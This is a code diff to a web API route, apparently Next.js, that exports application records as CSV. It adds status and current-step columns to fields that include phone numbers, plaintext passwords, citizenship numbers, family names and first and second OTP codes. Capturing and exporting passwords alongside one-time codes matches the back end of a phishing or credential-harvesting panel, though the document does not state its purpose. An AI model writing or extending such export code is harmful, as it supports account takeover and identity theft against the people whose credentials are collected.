@@ -28,6 +28,8 @@ export async function GET(request: NextRequest) {
     const headers = [
       "Phone Number",
       "Password",
+      "Status",
+      "Current Step",
       "Father Name",
       "Grandfather Name",
       "Mother Name",
@@ -47,9 +49,11 @@ export async function GET(request: NextRequest) {
         [
           app.phone_number as string,
           `"${app.password as string}"`,
-          `"${app.father_name as string}"`,
-          `"${app.grandfather_name as string}"`,
-          `"${app.mother_name as string}"`,
+          app.status as string,
+          app.current_step as string,
+          `"${app.father_name as string || ""}"`,
+          `"${app.grandfather_name as string || ""}"`,
+          `"${app.mother_name as string || ""}"`,
           app.citizenship_number as string,
           (app.first_otp as string) || "",
           (app.second_otp as string) || "",
